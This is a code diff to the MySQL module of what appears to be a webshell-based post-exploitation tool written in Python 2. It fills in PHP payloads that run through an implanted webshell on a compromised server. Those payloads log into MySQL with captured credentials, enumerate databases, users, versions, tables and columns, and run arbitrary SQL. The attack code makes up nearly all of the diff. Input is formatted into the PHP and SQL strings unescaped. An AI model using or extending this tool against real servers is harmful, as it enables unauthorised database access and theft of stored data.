@@ -22,6 +22,7 @@ class Mysql():
 
     def check_connection(self, webshell):
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new mysqli($h,$u,$p);if(mysqli_connect_error()){echo mysqli_connect_error();}$c->close();" % (self.ip, self.username, self.password)
+        Log.info("Executing : \n%s" % code)
         result = webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
@@ -47,7 +48,9 @@ class Mysql():
         if self.database != "":
             Log.success(self.database)
             return
-        result = self.webshell.php_code_exec("");
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select database()';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
             database = content
@@ -60,7 +63,9 @@ class Mysql():
         if self.user != "":
             Log.success(self.user)
             return
-        result = self.webshell.php_code_exec("");
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select user()';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
             user = content
@@ -73,7 +78,9 @@ class Mysql():
         if self.version != "":
             Log.success(self.version)
             return
-        result = self.webshell.php_code_exec("");
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select @@version';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
             version = content
@@ -84,9 +91,11 @@ class Mysql():
 
     def get_databases(self):
         if len(self.databases) != 0:
-            Log.success(list2string(self.databases, "\t", "\n"))
+            Log.success("Database : \n" + list2string(self.databases, "=> [", "]\n"))
             return
-        result = self.webshell.php_code_exec("error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('information_schema');$s='select schema_name from information_schema.schemata';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password));
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('information_schema');$s='select schema_name from information_schema.schemata';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
             databases = content.split(",")[0:-1]
@@ -96,25 +105,32 @@ class Mysql():
             Log.error("Error occured!")
 
     def get_table_from_database(self, database):
-        result = self.webshell.php_code_exec("");
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('%s');$s='select table_name from information_schema.tables where table_schema = \"%s\"';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password, database, database)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
-            tables = content.split(",")
-            Log.success(list2string(tables, "\t", "\n"))
+            tables = content.split(",")[0:-1]
+            Log.success(list2string(tables, "=> [", "]\n"))
         else:
             Log.error("Error occured!")
 
     def get_columns_from_table(self, tablename, database):
-        result = self.webshell.php_code_exec("");
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('%s');$s='select column_name from information_schema.columns where table_name = \"%s\"';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password, database, tablename)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
-            columns = content.split(",")
-            Log.success(list2string(columns, "\t", "\n"))
+            columns = content.split(",")[0:-1]
+            Log.success(list2string(columns, "=> [", "]\n"))
         else:
             Log.error("Error occured!")
 
     def sql_exec(self, sql):
-        result = self.webshell.php_code_exec("");
+        # TODO 数据显示不完整的 BUG
+        code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='%s';$r=$c->query($s);while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password, sql)
+        Log.info("Executing : \n%s" % code)
+        result = self.webshell.php_code_exec(code)
         if result[0]:
             content = result[1]
             Log.success(content)
@@ -132,6 +148,10 @@ class Mysql():
         print "        6. [c] : get all columns of a table"
         print "        7. [e] : execute a sql query"
         print "        8. [q] : quit"
+        print "        9. [a] : auto fetch database"
+
+    def auto_fetch(self):
+        pass
 
     def interactive(self):
         self.help()
@@ -150,6 +170,7 @@ class Mysql():
             elif command == "d":
                 self.get_databases()
             elif command == "t":
+                self.get_databases()
                 database = self.database
                 if database == "":
                     database = raw_input("Input database name : ")
@@ -157,12 +178,14 @@ class Mysql():
                     Log.error("No database selected! Please input : [cd] command!")
                 self.get_table_from_database(database)
             elif command == "c":
+                self.get_databases()
                 database = self.database
                 if database == "":
                     database = raw_input("Input database name : ")
                 if database == "":
                     Log.error("No database selected! Please input : [cd] command!")
                     continue
+                self.get_table_from_database(database)
                 table = raw_input("Input table name : ")
                 if table == "":
                     Log.error("No tablename inputed!")
